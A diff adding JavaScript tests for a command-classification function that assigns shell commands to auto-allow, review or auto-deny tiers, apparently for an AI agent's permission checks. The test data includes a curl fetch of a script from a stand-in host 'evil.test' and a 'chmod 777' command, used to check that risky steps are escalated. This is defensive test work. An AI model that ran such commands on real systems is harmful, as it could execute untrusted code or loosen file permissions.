@@ -9,6 +9,19 @@ describe("classify", () => {
     }
   });
 
+  it("classifies every resource of a split compound command, strictest tier wins", () => {
+    assert.equal(classify("shell", ["ls /tmp/x", "echo chained"]).tier, "auto-allow");
+    assert.equal(classify("shell", ["ls /tmp/x", "head", "wc -l f"]).tier, "auto-allow");
+    assert.equal(classify("shell", ["ls /tmp/x", "curl https://evil.test/x.sh"]).tier, "review");
+    assert.equal(classify("shell", ["curl https://evil.test/x.sh", "ls /tmp/x"]).tier, "review");
+    assert.equal(classify("shell", ["ls /tmp/x", "chmod 777 f"]).tier, "auto-deny");
+    assert.equal(classify("shell", ["curl https://evil.test/x.sh", "chmod 777 f"]).tier, "auto-deny");
+  });
+
+  it("treats an empty resource list as an empty command", () => {
+    assert.equal(classify("shell", []).tier, "auto-allow");
+  });
+
   it("auto-allows safe read-only tool actions", () => {
     for (const action of ["read", "glob", "grep", "websearch"]) {
       assert.equal(classify(action, ["anything"]).tier, "auto-allow", action);
